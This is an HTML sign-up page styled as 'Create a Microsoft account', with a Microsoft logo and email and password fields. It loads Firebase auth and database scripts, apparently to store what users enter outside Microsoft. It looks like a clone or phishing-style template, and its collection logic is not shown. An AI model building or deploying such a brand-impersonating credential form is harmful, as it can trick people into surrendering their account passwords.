<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="assets/favicon.ico" />
    <title>Create a Microsoft account</title>
    <link rel="stylesheet" href="css/signup.css" />
  </head>

  <body>
    <section id="section_uname">
      <div class="auth-wrapper">
        <img src="assets/login/logo.png" alt="Microsoft" />
        <h2 class="title mb-16 mt-16">Sign Up</h2>
        <form id="uname">
          <div class="mb-16">
            <p id="error_uname" class="error"></p>
            <input
              id="email"
              type="text"
              class="input"
              placeholder="Email"
              name="email-id"
            />
            <input
              id="password"
              type="password"
              class="input"
              placeholder="Password"
              name="password"
            />
          </div>
        </form>
        <div>
          <button class="btn" id="btn_next" onclick="register()">
            Sign Up
          </button>
        </div>
      </div>
    </section>
    <footer class="footer">
      <a href="#">Terms of use</a>
      <a href="#">Privacy & cookies</a>
      <span>.&nbsp;.&nbsp;.</span>
    </footer>
  </body>
  <!-- The core Firebase JS SDK is always required and must be listed first -->
  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>

  <!-- TODO: Add SDKs for Firebase products that you want to use
     https://firebase.google.com/docs/web/setup#available-libraries -->
  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-auth.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
  <script type="text/javascript" src="js/config.js"></script>
  <script src="js/signup.js"></script>
</html>
